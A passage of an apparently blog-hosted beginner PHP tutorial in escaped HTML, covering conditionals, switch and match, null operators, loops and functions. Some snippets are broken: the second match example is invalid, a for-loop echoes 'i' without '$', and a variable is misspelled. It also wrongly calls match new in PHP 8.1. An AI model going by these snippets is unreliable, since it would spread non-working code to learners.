   &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$messsage&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;





&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$value&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Variable is set'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Variable is unset'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h3&gt;
  &lt;a href="#using-if-statement-in-an-html-file"&gt;
  &lt;/a&gt;
  Using IF statement in an HTML file
&lt;/h3&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight html"&gt;&lt;code&gt;&lt;span class="nt"&gt;&amp;lt;html&lt;/span&gt; &lt;span class="na"&gt;lang=&lt;/span&gt;&lt;span class="s"&gt;"en"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;

&lt;span class="nt"&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
    &lt;span class="cp"&gt;&amp;lt;?php $isAdmin = true; ?&amp;gt;&lt;/span&gt;

    &lt;span class="nt"&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;Home page&lt;span class="nt"&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;

    &lt;span class="cp"&gt;&amp;lt;?php if ($isAdmin) : ?&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;p&amp;gt;&lt;/span&gt;Welcome Administrator&lt;span class="nt"&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
    &lt;span class="cp"&gt;&amp;lt;?php else : ?&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;p&amp;gt;&lt;/span&gt;Welcome Guest&lt;span class="nt"&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
    &lt;span class="cp"&gt;&amp;lt;?php endif ?&amp;gt;&lt;/span&gt;

&lt;span class="nt"&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;

&lt;span class="nt"&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Each block of PHP code has an opening and closing tag. The particularity here is the “if” and “else” code block. There's no  { }. You can use “:” instead.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#switch"&gt;
  &lt;/a&gt;
  Switch
&lt;/h3&gt;

&lt;p&gt;If we have several conditions, the if, elseif ect. can result in hard-to-read code. In this case, the Switch statement helps to simplify your code.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;switch&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$color&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="s1"&gt;'red'&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Danger'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
         &lt;span class="k"&gt;break&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="s1"&gt;'yellow'&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Warning'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="k"&gt;break&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="s1"&gt;'green'&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Success'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="k"&gt;break&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;default&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'The color is unknown'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The first line represents the expression we want to evaluate: switch($color)&lt;/p&gt;

&lt;p&gt;Then just include the possible “cases”.&lt;/p&gt;

&lt;p&gt;The “break” function prevents the execution from continuing&lt;/p&gt;

&lt;p&gt;The “case” default is used if there is no matching case.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#match"&gt;
  &lt;/a&gt;
  Match
&lt;/h3&gt;

&lt;p&gt;New in PHP 8.1, this instruction allows you to return an expression according to a key ⇒ value correspondence&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nv"&gt;$type&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nf"&gt;match&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$color&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="s1"&gt;'red'&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="s1"&gt;'danger'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="s1"&gt;'yellow'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'orange'&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="s1"&gt;'warning'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="s1"&gt;'green'&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="s1"&gt;'success'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="k"&gt;default&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="s1"&gt;'Unknown'&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The first line represents the expression we want to match: &lt;strong&gt;match&lt;/strong&gt;($color)&lt;/p&gt;

&lt;p&gt;On the second line we notice that it is possible to match more than one expression at a time.&lt;/p&gt;

&lt;p&gt;Then follows a list of &lt;strong&gt;key&lt;/strong&gt; ⇒ &lt;strong&gt;value&lt;/strong&gt;. If no &lt;strong&gt;key&lt;/strong&gt;→&lt;strong&gt;value&lt;/strong&gt; is found, the &lt;strong&gt;default&lt;/strong&gt; key will be executed.&lt;/p&gt;

&lt;p&gt;Note that the key can be an expression and the value can also be an expression and even a function&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nv"&gt;$type&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nf"&gt;match&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$color&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;userID&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;100&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nf"&gt;openAdmin&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt;
    &lt;span class="n"&gt;userID&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;100&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="n"&gt;userID&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nf"&gt;openUser&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt;
    &lt;span class="k"&gt;default&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nf"&gt;openOther&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h3&gt;
  &lt;a href="#switch-ou-match-"&gt;
  &lt;/a&gt;
  Switch ou Match ?
&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Match&lt;/strong&gt; is visually simpler but &lt;strong&gt;Switch&lt;/strong&gt; allows to execute more than one line of code for each “box”. &lt;strong&gt;Match&lt;/strong&gt; returns a value which &lt;strong&gt;Switch&lt;/strong&gt; does not. In short, I use &lt;strong&gt;Match&lt;/strong&gt; if possible because I find the instruction more visually refined but otherwise I have no problem with the &lt;strong&gt;Switch&lt;/strong&gt; instruction&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#ternary-operator-"&gt;
  &lt;/a&gt;
  Ternary operator  ?:
&lt;/h3&gt;

&lt;p&gt;This is a shorthand syntax for an if...else.&lt;/p&gt;

&lt;p&gt;Here is an example with if...else&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$isValid&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'user valid'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'user not valid'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Here is the same example but with the Ternary operator&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$isValid&lt;/span&gt; &lt;span class="o"&gt;?&lt;/span&gt; &lt;span class="s1"&gt;'user valid'&lt;/span&gt; &lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;'user not valid'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;If the expression preceding the operator “?” is true then the value following “?” will be used, otherwise the value following the “:” will be used.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#the-null-coalescing-operator-"&gt;
  &lt;/a&gt;
  The null coalescing operator ??
&lt;/h3&gt;

&lt;p&gt;The Null coalescing operator returns its first operand if it exists and is not NULL; otherwise it returns its second operand&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$name&lt;/span&gt; &lt;span class="o"&gt;??&lt;/span&gt; &lt;span class="s1"&gt;'Mike'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;  &lt;span class="c1"&gt;//output 'Mike' if $name is null&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h3&gt;
  &lt;a href="#assignment-with-null-coalescing-operator-"&gt;
  &lt;/a&gt;
  Assignment with Null coalescing operator ??
&lt;/h3&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nv"&gt;$name&lt;/span&gt; &lt;span class="o"&gt;??=&lt;/span&gt; &lt;span class="s1"&gt;'Mike'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Assigns the value 'Mike' if the variable $name is null&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#null-safe-operator"&gt;
  &lt;/a&gt;
  Null safe operator
&lt;/h3&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$user&lt;/span&gt;&lt;span class="o"&gt;?-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;profile&lt;/span&gt;&lt;span class="o"&gt;?-&amp;gt;&lt;/span&gt;&lt;span class="nf"&gt;activate&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;If one of the variables preceding the “?” is null then the value of of the expression will be null&lt;/p&gt;

&lt;h1&gt;
  &lt;a href="#loops"&gt;
  &lt;/a&gt;
  Loops
&lt;/h1&gt;

&lt;h3&gt;
  &lt;a href="#the-while-loop"&gt;
  &lt;/a&gt;
  The “while” loop
&lt;/h3&gt;

&lt;p&gt;Allows a block of code to be executed a certain number of times. The number of times will depend on the conditions. As long as the condition is true, the code block will run.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nv"&gt;$number&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$number&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'value : '&lt;/span&gt; &lt;span class="mf"&gt;.&lt;/span&gt; &lt;span class="nv"&gt;$number&lt;/span&gt; &lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nv"&gt;$number&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Here the code block will be executed 9 times.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#do-while-loop"&gt;
  &lt;/a&gt;
  “do while” loop
&lt;/h3&gt;

&lt;p&gt;Essentially the same principle as the “while” loop, but in this case the block of code will always execute at least once. The condition being tested only at the end of the code block.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nv"&gt;$number&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="k"&gt;do&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'value : '&lt;/span&gt; &lt;span class="mf"&gt;.&lt;/span&gt; &lt;span class="nv"&gt;$number&lt;/span&gt; &lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nv"&gt;$number&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$number&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h3&gt;
  &lt;a href="#the-for-loop"&gt;
  &lt;/a&gt;
  The “for” loop
&lt;/h3&gt;

&lt;p&gt;Used to execute a block of code a number of times defined by a condition.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;$i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;$i&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;"i value = "&lt;/span&gt; &lt;span class="mf"&gt;.&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The parameter is divided into three sections, the first being the definition of the counter ($i = 0). Then the condition to respect to execute the block of code ($i &amp;lt; 20) and finally the code to execute at each iteration ($i++)&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#the-foreach-loop"&gt;
  &lt;/a&gt;
  The “foreach” loop
&lt;/h3&gt;

&lt;p&gt;The foreach function executes a block of code for each element of an array.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nv"&gt;$names&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;'Mike'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'Shawn'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'John'&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;

&lt;span class="k"&gt;foreach&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$names&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="nv"&gt;$name&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; 
   &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Hello '&lt;/span&gt; &lt;span class="mf"&gt;.&lt;/span&gt; &lt;span class="nv"&gt;$name&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The first parameter is the name of the array to browse, the second parameter represents the reference to the current element.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#break-and-continue"&gt;
  &lt;/a&gt;
  Break and Continue
&lt;/h3&gt;

&lt;p&gt;The break and continue statements are used to modify the loop&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;$i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;$i&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$i&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt; &lt;span class="o"&gt;===&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;continue&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$i&lt;/span&gt; &lt;span class="mf"&gt;.&lt;/span&gt; &lt;span class="s1"&gt;'&amp;lt;br&amp;gt;'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;This loop will print the value of $i, only when the value is odd.&lt;/p&gt;

&lt;p&gt;If the value is even ($i % 2 === 0). So we ask the loop to do a &lt;strong&gt;continue&lt;/strong&gt; with the next value.&lt;/p&gt;

&lt;p&gt;It is possible to exit the loop at any time with the &lt;strong&gt;break&lt;/strong&gt; instruction&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nv"&gt;$i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;10000&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nv"&gt;$i&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$i&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;break&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$i&lt;/span&gt; &lt;span class="mf"&gt;.&lt;/span&gt; &lt;span class="s1"&gt;'&amp;lt;br&amp;gt;'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Here the loop will stop when $i will have 10 as value&lt;/p&gt;

&lt;h1&gt;
  &lt;a href="#functions"&gt;
  &lt;/a&gt;
  Functions
&lt;/h1&gt;

&lt;p&gt;In PHP there are several functions already pre-defined. It is also possible to create our own functions.&lt;/p&gt;

&lt;p&gt;Functions allow us to avoid repeating our code several times. They also allow us to divide our application into small pieces that are easier to maintain.&lt;/p&gt;

&lt;p&gt;The syntax for creating a function is quite simple&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="n"&gt;hello&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Hello World'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Here we use the keyword “function” followed by the name of our function.&lt;/p&gt;

&lt;p&gt;Once our function has been created, it is possible to launch its execution&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nf"&gt;hello&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;It is possible to include one or more parameters to our function&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="n"&gt;hello&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$firstName&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$lastName&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Hello'&lt;/span&gt; &lt;span class="mf"&gt;.&lt;/span&gt; &lt;span class="nv"&gt;$firstName&lt;/span&gt; &lt;span class="mf"&gt;.&lt;/span&gt; &lt;span class="s1"&gt;' '&lt;/span&gt; &lt;span class="mf"&gt;.&lt;/span&gt; &lt;span class="nv"&gt;$lastName&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The launch of the function must include the parameters in the order they were declared&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nf"&gt;hello&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'Mike'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'Taylor'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;A default value can be assigned to a parameter which suddenly makes this parameter optional when calling the function.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="n"&gt;hello&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$firstName&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$lastName&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;'none'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Hello'&lt;/span&gt; &lt;span class="mf"&gt;.&lt;/span&gt; &lt;span class="nv"&gt;$firstName&lt;/span&gt; &lt;span class="mf"&gt;.&lt;/span&gt; &lt;span class="s1"&gt;' '&lt;/span&gt; &lt;span class="mf"&gt;.&lt;/span&gt; &lt;span class="nv"&gt;$lastName&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="nf"&gt;hello&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'Mike'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="c1"&gt;// Mike none&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Note that parameters with a default value must absolutely be defined last.&lt;/p&gt;

